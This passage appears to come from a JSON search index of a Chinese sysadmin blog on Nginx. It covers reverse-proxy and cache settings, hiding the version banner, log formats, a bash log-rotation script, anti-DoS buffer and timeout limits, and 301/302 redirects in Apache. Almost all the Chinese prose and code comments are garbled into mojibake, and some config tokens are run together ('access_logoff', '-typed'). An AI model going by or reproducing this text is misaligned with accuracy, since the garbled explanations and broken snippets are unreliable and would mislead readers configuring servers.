.*\\.(gif|jpg|jpeg|png|bmp|swf)$&#123;expires 10d;&#125;#JSå’ŒCSSç¼“å­˜æ—¶é—´è®¾ç½®location ~ .*\\.(js|css)?$&#123;expires 1h;&#125;#æ—¥å¿—æ ¼å¼è®¾å®šlog_format access '$remote_addr - $remote_user [$time_local] \"$request\" ''$status $body_bytes_sent \"$http_referer\" ''\"$http_user_agent\" $http_x_forwarded_for';#å®šä¹‰æœ¬è™šæ‹Ÿä¸»æœºçš„è®¿é—®æ—¥å¿—access_log /var/log/nginx/ha97access.log access;#å¯¹ \"/\" å¯ç”¨åå‘ä»£ç†location / &#123;proxy_pass http://127.0.0.1:88;proxy_cache cache_one; #å¼€å¯ç¼“å­˜proxy_cache_valid 200 304 7d; #æ­£å¸¸çŠ¶æ€ç¼“å­˜ï¼Œå› ä¸ºå¤´åƒä¸ç»å¸¸æ”¹åŠ¨æ‰€ä»¥ç¼“å­˜7å¤©proxy_redirect off;proxy_set_header X-Real-IP $remote_addr;#åç«¯çš„WebæœåŠ¡å™¨å¯ä»¥é€šè¿‡X-Forwarded-Forè·å–ç”¨æˆ·çœŸå®IPproxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;#ä»¥ä¸‹æ˜¯ä¸€äº›åå‘ä»£ç†çš„é…ç½®ï¼Œå¯é€‰ã€‚proxy_set_header Host $host;client_max_body_size 10m; #å…è®¸å®¢æˆ·ç«¯è¯·æ±‚çš„æœ€å¤§å•æ–‡ä»¶å­—èŠ‚æ•°client_body_buffer_size 128k; #ç¼“å†²åŒºä»£ç†ç¼“å†²ç”¨æˆ·ç«¯è¯·æ±‚çš„æœ€å¤§å­—èŠ‚æ•°ï¼Œproxy_connect_timeout 90; #nginxè·Ÿåç«¯æœåŠ¡å™¨è¿æ¥è¶…æ—¶æ—¶é—´(ä»£ç†è¿æ¥è¶…æ—¶)proxy_send_timeout 90; #åç«¯æœåŠ¡å™¨æ•°æ®å›ä¼ æ—¶é—´(ä»£ç†å‘é€è¶…æ—¶)proxy_read_timeout 90; #è¿æ¥æˆåŠŸåï¼Œåç«¯æœåŠ¡å™¨å“åº”æ—¶é—´(ä»£ç†æ¥æ”¶è¶…æ—¶)proxy_buffer_size 4k; #è®¾ç½®ä»£ç†æœåŠ¡å™¨ï¼ˆnginxï¼‰ä¿å­˜ç”¨æˆ·å¤´ä¿¡æ¯çš„ç¼“å†²åŒºå¤§å°proxy_buffers 4 32k; #proxy_buffersç¼“å†²åŒºï¼Œç½‘é¡µå¹³å‡åœ¨32kä»¥ä¸‹çš„è®¾ç½®proxy_busy_buffers_size 64k; #é«˜è´Ÿè·ä¸‹ç¼“å†²å¤§å°ï¼ˆproxy_buffers*2ï¼‰proxy_temp_file_write_size 64k;#è®¾å®šç¼“å­˜æ–‡ä»¶å¤¹å¤§å°ï¼Œå¤§äºè¿™ä¸ªå€¼ï¼Œå°†ä»upstreamæœåŠ¡å™¨ä¼ &#125;#è®¾å®šæŸ¥çœ‹NginxçŠ¶æ€çš„åœ°å€location /NginxStatus &#123;stub_status on;access_log on;auth_basic \"NginxStatus\";auth_basic_user_file conf/htpasswd;#htpasswdæ–‡ä»¶çš„å†…å®¹å¯ä»¥ç”¨apacheæä¾›çš„htpasswdå·¥å…·æ¥äº§ç”Ÿã€‚&#125;#æœ¬åœ°åŠ¨é™åˆ†ç¦»åå‘ä»£ç†é…ç½®#æ‰€æœ‰jspçš„é¡µé¢å‡äº¤ç”±tomcatæˆ–resinå¤„ç†location ~ .(jsp|jspx|do)?$ &#123;proxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;proxy_pass http://127.0.0.1:8080;&#125;#æ‰€æœ‰é™æ€æ–‡ä»¶ç”±nginxç›´æ¥è¯»å–ä¸ç»è¿‡tomcatæˆ–resinlocation ~ .*.(htm|html|gif|jpg|jpeg|png|bmp|swf|ioc|rar|zip|txt|flv|mid|doc|ppt|pdf|xls|mp3|wma)$&#123; expires 15d; &#125;location ~ .*.(js|css)?$&#123; expires 1h; &#125;&#125;&#125;","link":"/2016/05/23/WebæœåŠ¡æŠ€æœ¯/Nginx/Nginxå¤šç§å®‰è£…ä¸é…ç½®æ–‡ä»¶è¯¦è§£/"},{"title":"ä¼ä¸šçº§Nginx WebæœåŠ¡ä¼˜åŒ–å®æˆ˜","text":"ä¼ä¸šçº§Nginx WebæœåŠ¡ä¼˜åŒ–å®æˆ˜å‰è¨€: åœ¨è¿ç»´å·¥ä½œå·²ç»3ä¸ªå¹´ï¼Œè¿ç»´å²—ä½ï¼šå¯¹webæœåŠ¡æ˜¯å¿…é¡»è¦ä¼šçš„ï¼Œè¿™æ¬¡æˆ‘å¯¹Nginx WebæœåŠ¡åšä¸€æ¬¡ä¼˜åŒ–æ€»ç»“ï¼Œä¸Šæ¬¡è®°å¾—å†™åšå®¢æ˜¯å¯¹Nginxé…ç½®è¯¦è§£å’ŒæœåŠ¡çš„é«˜å¯ç”¨ã€‚å¸Œæœ›å†™çš„å¯¹ä½ çœ‹åˆ°æˆ‘åšå®¢çš„äººæœ‰æ‰€å¸®åŠ©ã€‚ 1.1 Nginx åŸºæœ¬å®‰å…¨ä¼˜åŒ–1.1.2 è°ƒæ•´å‚æ•°éšè—Nginxè½¯ä»¶ç‰ˆæœ¬å·ä¿¡æ¯ è¿™é‡Œè¯´éšè—ç‰ˆæœ¬å·é‡è¦æ€§è½¯ä»¶å‡ºç°æ¼æ´è·Ÿç‰ˆæœ¬ç‰¹åˆ«æœ‰å…³ç³»ï¼Œæˆ‘ä»¬å°½å¯èƒ½éšè—æˆ–æ¶ˆé™¤webæœåŠ¡é˜Ÿè®¿é—®ç”¨æˆ·æ˜¾ç¤ºå„ç±»æ•æ„Ÿä¿¡æ¯ï¼Œè¿™æ ·æ¶æ„è¦æ”»å‡»ä½ çš„ç”¨æˆ·å°±å¾ˆéš¾çŒœåˆ°ä»–æ”»å‡»çš„æœåŠ¡æ‰€ç”¨çš„æ˜¯å¦æœ‰ç‰¹å®šçš„æ¼æ´çš„è½¯ä»¶ï¼Œæˆ–è€…æ˜¯å¦æœ‰å¯¹åº”æ¼æ´çš„æŸä¸€ç‰¹å®šç‰ˆæœ¬ï¼Œä»è€ŒåŠ å¼ºäº†WebæœåŠ¡çš„å®‰å…¨æ€§ã€‚ ä¾‹å­ï¼š 12345678910[root@nginx ~]# curl -I 127.0.0.7 HTTP/1.1 200 OKServer: nginx/1.9.7 #&lt;--è¿™é‡Œæ¸…æ™°åœ°æš´éœ²äº†webç‰ˆæœ¬å·ï¼ˆ1.9.7ï¼‰ä»¥åŠè½¯ä»¶åç§°ï¼ˆNginxï¼‰Date: Sat, 08 Apr 2017 08:15:59 GMTContent-Type: text/htmlContent-Length: 612Last-Modified: Thu, 19 Nov 2015 05:50:20 GMTConnection: keep-aliveETag: \"564d631c-264\"Accept-Ranges: bytes å¦‚ä½•éšè—å¯ä»¥é€šè¿‡é…ç½®æ–‡ä»¶åŠ å‚æ•°æ¥å®ç°ï¼š åœ¨Nginxé…ç½®æ–‡ä»¶Nginx.conf ä¸­çš„serveræ ‡ç­¾ğŸ·å†…åŠ å…¥â€œserver_tokens offâ€å‚æ•°ï¼Œå…·ä½“æŸ¥çœ‹å¦‚ä¸‹ï¼š 12345678910server &#123; listen 80; server_name localhost; server_tokens off; location / &#123; root html; index index.html index.htm; limit_req zone=one; &#125; é…ç½®å®Œæˆåä¿å­˜ï¼Œé‡æ–°åŠ è½½é…ç½®æ–‡ä»¶ï¼Œå†æ¬¡curlæŸ¥çœ‹ï¼š [root@nginx ~]# curl -I 127.0.0.7 HTTP/1.1 200 OK Server: nginx Date: Sat, 08 Apr 2017 08:20:31 GMT Content-Type: text/html Content-Length: 612 Last-Modified: Thu, 19 Nov 2015 05:50:20 GMT Connection: keep-alive ETag: \"564d631c-264\" Accept-Ranges: bytes","link":"/2016/08/23/WebæœåŠ¡æŠ€æœ¯/Nginx/ä¼ä¸šçº§Nginx WebæœåŠ¡ä¼˜åŒ–å®æˆ˜/"},{"title":"NginxåŸºç¡€ç¯‡-æ—¥å¿—ç®¡ç†å’Œåˆ‡å‰²","text":"å‰è¨€ï¼šå…¬å¸æ—¥å¿—æŸ¥çœ‹æœ‰æ—¶å€™ä¸å¤ªè§„èŒƒï¼Œå®˜ç½‘webæœåŠ¡æ—¥å¿—è¿™è¾¹æ•´ç†äº†ä¸‹Nginxæ—¥å¿—è¾“å‡ºä¼˜åŒ–ã€‚ ä¸€ã€æ—¥å¿—åˆ†ç±»Nginxæ—¥å¿—ä¸»è¦åˆ†ä¸ºä¸¤ç§ï¼Œè®¿é—®æ—¥å¿—å’Œé”™è¯¯æ—¥å¿—ã€‚ä¸¤ç§æ—¥å¿—å¯ä»¥åœ¨httpå’Œserveræ¨¡å—ä¸­é…ç½®ï¼Œnginxæœ‰ä¸€ä¸ªéå¸¸çµæ´»çš„æ—¥å¿—è®°å½•æ¨¡å¼ã€‚æ¯ä¸ªçº§åˆ«çš„é…ç½®å¯ä»¥æœ‰å„è‡ªç‹¬ç«‹çš„è®¿é—®æ—¥å¿—ã€‚æ—¥å¿—æ ¼å¼é€šè¿‡log_formatå‘½ä»¤æ¥å®šä¹‰ 1ã€è®¿é—®æ—¥å¿—è®¿é—®æ—¥å¿—ä¸»è¦è®°å½•å®¢æˆ·ç«¯è®¿é—®Nginxçš„æ¯ä¸€ä¸ªè¯·æ±‚log_formatç”¨æ¥è®¾ç½®æ—¥å¿—æ ¼å¼ï¼Œåªèƒ½åœ¨httpæ¨¡å—ä¸‹è®¾ç½® log_format name name(æ ¼å¼åç§°) type(æ ¼å¼æ ·å¼) ä¸‹é¢æ˜¯é»˜è®¤çš„nginxæ—¥å¿—æ ¼å¼ï¼š 123log_format main '$remote_addr - $remote_user [$time_local]\"$request\" ' '$status $body_bytes_sent\"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\"'; å­—æ®µå«ä¹‰ï¼š $remote_addrè¿œç¨‹å®¢æˆ·ç«¯çš„IPåœ°å€ã€‚ $remote_userè¿œç¨‹å®¢æˆ·ç«¯ç”¨æˆ·åç§°ï¼Œå¦‚æœç½‘ç«™è®¾ç½®äº†ç”¨æˆ·éªŒè¯çš„è¯å°±ä¼šæœ‰ï¼Œå¦åˆ™ç©ºç™½ [$time_local]è®¿é—®çš„æ—¶é—´ä¸æ—¶åŒºæ¯”å¦‚18/Jul/2012:17:00:01+0800æ—¶é—´ä¿¡æ¯æœ€åçš„&quot;+0800&quot;è¡¨ç¤ºæœåŠ¡å™¨æ‰€å¤„æ—¶åŒºä½äºUTCä¹‹åçš„8å°æ—¶ã€‚ $requestè®°å½•è¯·æ±‚çš„urlå’Œhttpåè®® $statusè®°å½•è¯·æ±‚è¿”å›çš„httpçŠ¶æ€ç . $body_bytes_sentè®°å½•å‘é€ç»™å®¢æˆ·ç«¯çš„æ–‡ä»¶ä¸»ä½“å†…å®¹çš„å¤§å° $http_refererè®°å½• è®°å½•ä»å“ªä¸ªé¡µé¢é“¾æ¥è®¿é—®è¿‡æ¥çš„ã€‚ $http_user_agentè®°å½•å®¢æˆ·ç«¯æµè§ˆå™¨ä¿¡æ¯ $http_x_forwarded_forå®¢æˆ·ç«¯çš„çœŸå®ipã€‚å½“nginxå‰é¢æœ‰ä»£ç†æœåŠ¡å™¨æ—¶ï¼Œ$remote_addrè·å–åˆ°çš„åªèƒ½æ˜¯nginxä¸Šä¸€çº§çš„IPï¼Œè€Œåå‘ä»£ç†æœåŠ¡å™¨åœ¨è½¬å‘è¯·æ±‚çš„httpå¤´ä¿¡æ¯ä¸­å¯ä»¥å¢åŠ x_forwarded_forä¿¡æ¯ç”¨ä»¥è®°å½•åŸæœ‰å®¢æˆ·ç«¯çš„IPåœ°å€å’ŒåŸæ¥å®¢æˆ·ç«¯çš„è¯·æ±‚çš„æœåŠ¡å™¨åœ°å€ï¼Œ$http_x_forwarded_forå‚æ•°å°±æ˜¯æ‰¿æ¥ä¸Šä¸€çº§ä¼ é€’çš„å®¢æˆ·ç«¯IPå‚æ•°ã€‚ä»è€Œå°±è·å–åˆ°äº†å®¢æˆ·ç«¯çš„çœŸå®IPã€‚ access_log æŒ‡ä»¤ç”¨æ¥æŒ‡å®šæ—¥å¿—æ–‡ä»¶çš„å­˜æ”¾è·¯å¾„ï¼Œå¯ä»¥åœ¨httpã€serverã€locationä¸­è®¾ç½® ä¸¾ä¾‹è¯´æ˜å¦‚ä¸‹ access_log logs/access.log main; å¦‚æœæƒ³å…³é—­æ—¥å¿—å¯ä»¥å¦‚ä¸‹ access_log off; 2ã€é”™è¯¯æ—¥å¿—é”™è¯¯æ—¥å¿—ä¸»è¦è®°å½•å®¢æˆ·ç«¯è®¿é—®Nginxå‡ºé”™æ—¶çš„æ—¥å¿—æ ¼å¼ï¼Œä¸æ”¯æŒè‡ªå®šä¹‰ã€‚ç”±æŒ‡ä»¤error_logæ¥æŒ‡å®šå…·ä½“æ ¼å¼å¦‚ä¸‹ 1error_log path(å­˜æ”¾è·¯å¾„) level(æ—¥å¿—ç­‰çº§)ã€debug | info | notice | warn | error |critã€‘ å¦‚æœä¸æŒ‡å®šè·¯å¾„çš„è¯é»˜è®¤æ˜¯åœ¨logsä¸‹ã€‚ 3.ç”Ÿäº§ç¯å¢ƒä¸‹å¸¸ç”¨çš„æ—¥å¿—æ ¼å¼ï¼š12log_format main '$http_host-$http_x_forwarded_for $&#123;request_time&#125;s- [$time_local] \"$request\"' '$status $body_bytes_sent\"$http_referer\" \"$http_user_agent\" $remote_addr ' ; äºŒã€æ—¥å¿—ç®¡ç†1.nginxæ—¥å¿—åˆ‡å‰² å®ç°æ€è·¯ï¼šæ¯å¤©å®šæ—¶æŠŠæ—¥å¿—ç§»åŠ¨åˆ°å¤‡ä»½ç›®å½•ï¼Œç„¶åé‡æ–°reloadæˆ–è€…restartã€‚è¿™æ ·ä¼šåœ¨åŸæ¥çš„logsä¸‹ç”Ÿæˆæ–°çš„æ—¥å¿—æ–‡ä»¶ã€‚(æç¤ºï¼šå½“æ—¥å¿—æ–‡ä»¶è¢«ç§»åŠ¨åˆ°å¤‡ä»½ç›®å½•åï¼Œåœ¨æ²¡æœ‰restartçš„ä¹‹å‰ï¼Œnginxä¾ç„¶ä¼šå‘åŸæ¥çš„æ—¥å¿—æ–‡ä»¶ä¸­è®°å½•è®¿é—®è¯·æ±‚ï¼Œåªæœ‰ç­‰restartçš„ä¹‹åç”Ÿæˆäº†æ–°æ–‡ä»¶ï¼Œæ‰é‡æ–°è®°å½•åˆ°æ–°çš„æ—¥å¿—æ–‡ä»¶ä¸­)å®ç°è„šæœ¬ï¼š 123456789101112131415161718192021222324#!/bin/bash#created by yangc #Log DirDIR_LOG=\"/var/log/nginx/\"weblog=(weixin1.ihaozhuo.com)DATE=`date -d\"yesterday\" +\"%Y%m%d\"` if [ ! -d\"$&#123;DIR_LOG&#125;/cut_log/$&#123;DATE&#125;\" ];then mkdir -p $&#123;DIR_LOG&#125;/cut_log/$&#123;DATE&#125;fiDIR=\"$&#123;DIR_LOG&#125;/cut_log/$&#123;DATE&#125;\" NGINX_LOG=\"$&#123;DIR_LOG&#125;/current\" for log in $&#123;weblog[@]&#125;; domv $&#123;NGINX_LOG&#125;/$log $DIRdone kill -USR1 `cat /usr/local/nginx/logs/nginx.pid`sleep 130find $&#123;DIR_LOG&#125;/cut_log/* -typed -mtime +7 -exec rm -rf &#123;&#125; \\;sleep 130 2.nginxä¸è®°å½•æŸäº›æ–‡ä»¶æˆ–ç›®å½•çš„è®¿é—®æ—¥å¿—æ–¹æ³•ï¼šå…ˆç”¨location å®šä¹‰ä¸è®°å½•æ—¥å¿—çš„æ–‡ä»¶æˆ–ç›®å½•ï¼Œç„¶ååœ¨å…¶ä¸‹é¢ç”¨ access_log off; è¿›è¡Œå…³é—­æ—¥å¿—å³å¯ä¾‹å¦‚ï¼š 123location ~*.\\checkstatus.html &#123; access_logoff;&#125;","link":"/2016/03/29/WebæœåŠ¡æŠ€æœ¯/Nginx/nginxåŸºç¡€ç¯‡-æ—¥å¿—ç®¡ç†å’Œåˆ‡å‰²/"},{"title":"ç¡®ä¿Nginxå®‰å…¨çš„å‡ ä¸ªæŠ€å·§","text":"åœ¨é…ç½®æ–‡ä»¶ä¸­è®¾ç½®è‡ªå®šä¹‰ç¼“å­˜ä»¥é™åˆ¶ç¼“å†²åŒºæº¢å‡ºæ”»å‡»çš„å¯èƒ½æ€§ 1234client_body_buffer_size 1K;client_header_buffer_size 1k;client_max_body_size 1k;large_client_header_buffers 2 1k; å°†timeoutè®¾ä½æ¥é˜²æ­¢DOSæ”»å‡»æ‰€æœ‰è¿™äº›å£°æ˜éƒ½å¯ä»¥æ”¾åˆ°ä¸»é…ç½®æ–‡ä»¶ä¸­ã€‚ 1234client_body_timeout 10;client_header_timeout 10;keepalive_timeout 5 5;send_timeout 10; é™åˆ¶ç”¨æˆ·è¿æ¥æ•°æ¥é¢„é˜²DOSæ”»å‡» 12limit_zone slimits $binary_remote_addr 5m;limit_conn slimits 5; ä¸ªäººè§‰å¾—åœ¨é˜²æ­¢DDOSæ”»å‡»è¿™æ–¹é¢ï¼Œè®¾ç½®è¿™äº›æ²¡å¤ªå¤§ç”¨å¤„ï¼Œç‰¹åˆ«æ˜¯ç¬¬ä¸‰ç‚¹ï¼Œå¾ˆæ‰°ä¹±ç”¨æˆ·ä½“éªŒåº¦çš„ã€‚","link":"/2016/03/27/WebæœåŠ¡æŠ€æœ¯/Nginx/ç¡®ä¿nginxå®‰å…¨çš„å‡ ä¸ªæŠ€å·§/"},{"title":"Http response code 301 å’Œ 302åˆ†ææ€»ç»“","text":"http response code 301 å’Œ 302 äº†è§£å¤šå°‘å‘¢ã€‚ä¸€ï¼å®˜æ–¹è¯´æ³•æœ€è¿‘Nginxè®¿é—®å‡ºç°301å’Œ302è¿™é‡Œå°±å¯¹301 302è®¤çœŸåšäº†ä¸€æ¬¡æ€»ç»“ã€‚ 123301ï¼Œ302 éƒ½æ˜¯HTTPçŠ¶æ€çš„ç¼–ç ï¼Œéƒ½ä»£è¡¨ç€æŸä¸ªURLå‘ç”Ÿäº†è½¬ç§»ï¼Œä¸åŒä¹‹å¤„åœ¨äºï¼š 301 redirect: 301 ä»£è¡¨æ°¸ä¹…æ€§è½¬ç§»(Permanently Moved)ã€‚302 redirect: 302 ä»£è¡¨æš‚æ—¶æ€§è½¬ç§»(Temporarily Moved )ã€‚ è¿™æ˜¯å¾ˆå®˜æ–¹çš„è¯´æ³•ï¼Œé‚£ä¹ˆå®ƒä»¬çš„åŒºåˆ«åˆ°åº•æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ äºŒï¼ç°å®ä¸­çš„å·®å¼‚ å¯¹äºç”¨æˆ·301ï¼Œ302å¯¹ç”¨æˆ·æ¥è¯´æ²¡æœ‰åŒºåˆ«ï¼Œä»–ä»¬çœ‹åˆ°æ•ˆæœåªæ˜¯ä¸€ä¸ªè·³è½¬ï¼Œæµè§ˆå™¨ä¸­æ—§çš„URLå˜æˆäº†æ–°çš„URLã€‚é¡µé¢è·³åˆ°äº†è¿™ä¸ªæ–°çš„urlæŒ‡å‘çš„åœ°æ–¹ã€‚ å¯¹äºå¼•æ“åŠç«™é•¿ 302 302è½¬å‘å¯èƒ½ä¼šæœ‰URLè§„èŒƒåŒ–åŠç½‘å€åŠ«æŒçš„é—®é¢˜ã€‚å¯èƒ½è¢«æœç´¢å¼•æ“åˆ¤ä¸ºå¯ç–‘è½¬å‘ï¼Œç”šè‡³è®¤ä¸ºæ˜¯ä½œå¼Šã€‚ç½‘å€è§„èŒƒåŒ– è¯·å‚è§ï¼šç½‘å€åŠ«æŒ 302é‡å®šå‘å’Œç½‘å€åŠ«æŒï¼ˆURL hijackingï¼‰æœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Ÿè¿™è¦ä»æœç´¢å¼•æ“å¦‚ä½•å¤„ç†302è½¬å‘è¯´èµ·ã€‚ ä»å®šä¹‰æ¥è¯´ï¼Œä»ç½‘å€Aåšä¸€ä¸ª302é‡å®šå‘åˆ°ç½‘å€Bæ—¶ï¼Œä¸»æœºæœåŠ¡å™¨çš„éšå«æ„æ€æ˜¯ç½‘å€Aéšæ—¶æœ‰å¯èƒ½æ”¹ä¸»æ„ï¼Œé‡æ–°æ˜¾ç¤ºæœ¬èº«çš„å†…å®¹æˆ–è½¬å‘å…¶ä»–çš„åœ°æ–¹ã€‚å¤§éƒ¨åˆ†çš„æœç´¢å¼•æ“åœ¨å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œå½“æ”¶åˆ°302é‡å®šå‘æ—¶ï¼Œä¸€èˆ¬åªè¦å»æŠ“å–ç›®æ ‡ç½‘å€å°±å¯ä»¥äº†ï¼Œä¹Ÿå°±æ˜¯è¯´ç½‘å€Bã€‚å®é™…ä¸Šå¦‚æœæœç´¢å¼•æ“åœ¨é‡åˆ°302è½¬å‘æ—¶ï¼Œç™¾åˆ†ä¹‹ç™¾çš„éƒ½æŠ“å–ç›®æ ‡ç½‘å€Bçš„è¯ï¼Œå°±ä¸ç”¨æ‹…å¿ƒç½‘å€URLåŠ«æŒäº†ã€‚é—®é¢˜å°±åœ¨äºï¼Œæœ‰çš„æ—¶å€™æœç´¢å¼•æ“ï¼Œå°¤å…¶æ˜¯Googleï¼Œå¹¶ä¸èƒ½æ€»æ˜¯æŠ“å–ç›®æ ‡ç½‘å€ã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿæ¯”å¦‚è¯´ï¼Œæœ‰çš„æ—¶å€™Aç½‘å€å¾ˆçŸ­ï¼Œä½†æ˜¯å®ƒåšäº†ä¸€ä¸ª302é‡å®šå‘åˆ°Bç½‘å€ï¼Œè€ŒBç½‘å€æ˜¯ä¸€ä¸ªå¾ˆé•¿çš„ä¹±ä¸ƒå…«ç³Ÿçš„URLç½‘å€ï¼Œç”šè‡³è¿˜æœ‰å¯èƒ½åŒ…å«ä¸€äº›é—®å·ä¹‹ç±»çš„å‚æ•°ã€‚å¾ˆè‡ªç„¶çš„ï¼ŒAç½‘å€æ›´åŠ ç”¨æˆ·å‹å¥½ï¼Œè€ŒBç½‘å€æ—¢éš¾çœ‹ï¼Œåˆä¸ç”¨æˆ·å‹å¥½ã€‚è¿™æ—¶Googleå¾ˆæœ‰å¯èƒ½ä¼šä»ç„¶æ˜¾ç¤ºç½‘å€Aã€‚ç”±äºæœç´¢å¼•æ“æ’åç®—æ³•åªæ˜¯ç¨‹åºè€Œä¸æ˜¯äººï¼Œåœ¨é‡åˆ°302é‡å®šå‘çš„æ—¶å€™ï¼Œå¹¶ä¸èƒ½åƒäººä¸€æ ·çš„å»å‡†ç¡®åˆ¤å®šå“ªä¸€ä¸ªç½‘å€æ›´é€‚å½“ï¼Œè¿™å°±é€ æˆäº†ç½‘å€URLåŠ«æŒçš„å¯èƒ½æ€§ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªä¸é“å¾·çš„äººåœ¨ä»–è‡ªå·±çš„ç½‘å€Aåšä¸€ä¸ª302é‡å®šå‘åˆ°ä½ çš„ç½‘å€Bï¼Œå‡ºäºæŸç§åŸå› ï¼Œ Googleæœç´¢ç»“æœæ‰€æ˜¾ç¤ºçš„ä»ç„¶æ˜¯ç½‘å€Aï¼Œä½†æ˜¯æ‰€ç”¨çš„ç½‘é¡µå†…å®¹å´æ˜¯ä½ çš„ç½‘å€Bä¸Šçš„å†…å®¹ï¼Œè¿™ç§æƒ…å†µå°±å«åšç½‘å€URLåŠ«æŒã€‚ä½ è¾›è¾›è‹¦è‹¦æ‰€å†™çš„å†…å®¹å°±è¿™æ ·è¢«åˆ«äººå·èµ°äº†ã€‚ 301 å½“ç½‘é¡µAç”¨301é‡å®šå‘è½¬åˆ°ç½‘é¡µBæ—¶ï¼Œæœç´¢å¼•æ“å¯ä»¥è‚¯å®šç½‘é¡µAæ°¸ä¹…çš„æ”¹å˜ä½ç½®ï¼Œæˆ–è€…è¯´å®é™…ä¸Šä¸å­˜åœ¨äº†ï¼Œæœç´¢å¼•æ“å°±ä¼šæŠŠç½‘é¡µBå½“ä½œå”¯ä¸€æœ‰æ•ˆç›®æ ‡ã€‚301çš„å¥½å¤„æ˜¯: 12ç¬¬ä¸€ï¼Œ æ²¡æœ‰ç½‘å€è§„èŒƒåŒ–é—®é¢˜ã€‚ç¬¬äºŒï¼Œ ä¹Ÿå¾ˆé‡è¦çš„ï¼Œç½‘é¡µAçš„PRç½‘é¡µçº§åˆ«ä¼šä¼ åˆ°ç½‘é¡µBã€‚ ä¸‰ï¼Apacheä¸­å®ç°301ã€302 æ–¹æ³•ä¸€ï¼Œurl rewriteï¼Œmod_rewrite [plain] 12345view plain copyRewriteengine on RewriteCond %&#123;HTTP_HOST&#125; ^cmp.soso.com [NC] RewriteRule ^/js/(.*) http://www.soso.com/js/$1 [R=301] ServerName cmp.soso.com å°†cmp.soso.comä¸­jsç›®å½•çš„ä¸‹æ‰€æœ‰è®¿é—®é‡å®šå‘åˆ°http://www.soso.com/js/ï¼ŒæŒ‡å®šè·³è½¬è¿”å›ç ä¸º301ã€‚å¯¹äº[R=301]çš„è¯¦è§£ï¼šâ€˜redirect|R [=code]â€™ (å¼ºåˆ¶é‡å®šå‘ redirect)ä»¥http://thishost[:thisport]/(ä½¿æ–°çš„URLæˆä¸ºä¸€ä¸ªURI) ä¸ºå‰ç¼€çš„Substitutionå¯ä»¥å¼ºåˆ¶æ€§æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨é‡å®šå‘ã€‚ å¦‚æœcodeæ²¡æœ‰æŒ‡å®šï¼Œåˆ™äº§ç”Ÿä¸€ä¸ªHTTPå“åº”ä»£ç 302(ä¸´æ—¶æ€§ç§»åŠ¨)ã€‚ å¦‚æœéœ€è¦ä½¿ç”¨åœ¨300-400èŒƒå›´å†…çš„å…¶ä»–å“åº”ä»£ç ï¼Œåªéœ€åœ¨æ­¤æŒ‡å®šè¿™ä¸ªæ•°å€¼å³å¯ï¼Œ å¦å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ä¸‹åˆ—ç¬¦å·åç§°ä¹‹ä¸€: temp (é»˜è®¤çš„), permanent, seeother. ç”¨å®ƒå¯ä»¥æŠŠè§„èŒƒåŒ–çš„URLåé¦ˆç»™å®¢æˆ·ç«¯ï¼Œå¦‚,é‡å†™``/~&#39;&#39;ä¸º ``/u/&#39;&#39;ï¼Œæˆ–å¯¹/u/useråŠ ä¸Šæ–œæ ï¼Œç­‰ç­‰ã€‚ æ³¨æ„: åœ¨ä½¿ç”¨è¿™ä¸ªæ ‡è®°æ—¶ï¼Œå¿…é¡»ç¡®ä¿è¯¥æ›¿æ¢å­—æ®µæ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„URL! å¦åˆ™ï¼Œå®ƒä¼šæŒ‡å‘ä¸€ä¸ªæ— æ•ˆçš„ä½ç½®! å¹¶ä¸”è¦è®°ä½ï¼Œæ­¤æ ‡è®°æœ¬èº«åªæ˜¯å¯¹URLåŠ ä¸Š http://thishost[:thisport]/çš„å‰ç¼€ï¼Œ`é‡å†™æ“ä½œä»ç„¶ä¼šç»§ç»­`ã€‚ é€šå¸¸ï¼Œä½ ä¼šå¸Œæœ›åœæ­¢é‡å†™æ“ä½œè€Œç«‹å³é‡å®šå‘ï¼Œåˆ™è¿˜éœ€è¦ä½¿ç”¨â€™Lâ€™æ ‡è®°. æ–¹æ³•äºŒ Redirect ï¼Œæ¶‰åŠæ¨¡å—ï¼šmod_alias ä¾‹ï¼š 123456[plain] view plain copy&lt;VirtualHost 10.1.146.163:80&gt; DocumentRoot /home/qmhball/web/mybranches/stat_3276/oa/ ServerName oalogin.com Redirect 301 /login.php http://www.soso.com &lt;/VirtualHost&gt; å°†oalogin.comä¸‹å¯¹login.phpçš„è®¿é—®é‡å®šå‘åˆ°http://www.soso.comï¼Œè¿”å›ç 301ã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šredirectçš„è¿”å›å‚æ•°ï¼ˆä¾‹ä¸­çš„301ï¼‰ï¼Œåˆ™é»˜è®¤é‡å®šå‘æ˜¯â€ä¸´æ—¶æ€§çš„â€(HTTP status 302)ã€‚","link":"/2016/04/02/WebæœåŠ¡æŠ€æœ¯/Nginx/http response code 301 å’Œ 302åˆ†ææ€»ç»“/"},{"title":"å¦‚ä½•åœ¨Nginxç”³è¯·å®‰è£…é…ç½®å…è´¹HTTPSè¯ä¹¦+é˜¿é‡Œäº‘SLBå¦‚ä½•é…ç½®HTTPS","text":"å¦‚ä½•åœ¨Nginxç”³è¯·å®‰è£…é…ç½®å…è´¹HTTPSè¯ä¹¦HTTPSåœ¨å„å¤§äº’è”ç½‘ç«™å·²ç»æˆä¸ºæ ‡é…ï¼Œå°±è¿æŸåº¦ä¹Ÿåœ¨å‰ä¸ä¹…å…¨é¢å¯ç”¨HTTPSï¼Œå¾ˆå¤šå°ç½‘ç«™ä¹Ÿé…ç½®äº†HTTPSï¼Œè¿™æ˜¯æœªæ¥çš„ä¸€ç§è¶‹åŠ¿.HTTPSçš„å¥½å¤„å¤šå¤šï¼Œå¯ä»¥é˜²æ­¢å„ç§æ”»å‡»åŠ«æŒï¼Œè¿è¥å•†å¹¿å‘Šæ¤å…¥ï¼Œå®¢æˆ·ä¼ è¾“ä¿¡æ¯æ³„éœ²ç­‰é—®é¢˜ã€‚ä¸ºäº†è®©HTTPSèƒ½å¤Ÿå…¨é¢æ™®åŠï¼Œè®©æˆ‘ä»¬åŠ 